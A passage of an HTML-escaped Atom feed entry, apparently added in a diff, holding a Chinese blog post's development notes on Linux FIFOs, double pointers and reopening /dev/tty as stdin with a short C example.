+&lt;span class=&quot;n&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;mkfifo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FIFO_MODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;虽然对&lt;code class=&quot;highlighter-rouge&quot;&gt;FIFO&lt;/code&gt;进行了&lt;code class=&quot;highlighter-rouge&quot;&gt;unlink()&lt;/code&gt;, 文件已经不存在，但是内核实际上还在维护读写两端的文件描述符和对应的缓冲区。而第二次&lt;code class=&quot;highlighter-rouge&quot;&gt;mkfifo()&lt;/code&gt;即使创建的&lt;code class=&quot;highlighter-rouge&quot;&gt;FIFO&lt;/code&gt;的名字是一样的，内核会为它维护另一套空间。这样的话，无论是读端还是写端，连续的两次&lt;code class=&quot;highlighter-rouge&quot;&gt;open()&lt;/code&gt;都会阻塞。而且打开后缓冲区是空的。&lt;/p&gt;
+
+&lt;h4 id=&quot;二阶指针&quot;&gt;二阶指针&lt;/h4&gt;
+&lt;p&gt;二阶指针玩链表其实还是蛮有意思的嘛&lt;s&gt;(虽然只是少定义一个中间变量)&lt;/s&gt;…&lt;/p&gt;
+
+&lt;h4 id=&quot;stdin-stdout-stderr-and-tty&quot;&gt;stdin, stdout, stderr and tty&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/{stdin,stdout,stderr}&lt;/code&gt;默认分别是&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/self/fd/{0,1,2}&lt;/code&gt;的软链接，而&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/self/fd/{0,1,2}&lt;/code&gt;默认都是&lt;code class=&quot;highlighter-rouge&quot;&gt;pts&lt;/code&gt;或者&lt;code class=&quot;highlighter-rouge&quot;&gt;tty&lt;/code&gt;的软链接，所以&lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt;默认就是终端设备。当&lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt;被 shell 用管道替换之后，可以用以下方式重新打开键盘输入(另外两个类似):&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt; &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* for dup2(), close() and STDIN_FILENO */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include &amp;lt;fcntl.h&amp;gt; &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* for open() and O_RDONLY */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realstdin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dev/tty&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;realstdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STDIN_FILENO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;realstdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/tty&lt;/code&gt;总是当前终端设备&lt;/p&gt;
+
+&lt;h4 id=&quot;more&quot;&gt;More&lt;/h4&gt;
+&lt;p&gt;想到什么我再更新吧。&lt;/p&gt;
+
+&lt;h4 id=&quot;reference&quot;&gt;Reference&lt;/h4&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://linux.die.net/man/7/pipe&quot;&gt;pipe(7) - Linux man page&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2014/12/paf-develop-notes/&quot;&gt;Paf 开发总结&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 31, 2014.&lt;/p&gt;</content>
+</entry>
+
+</feed>
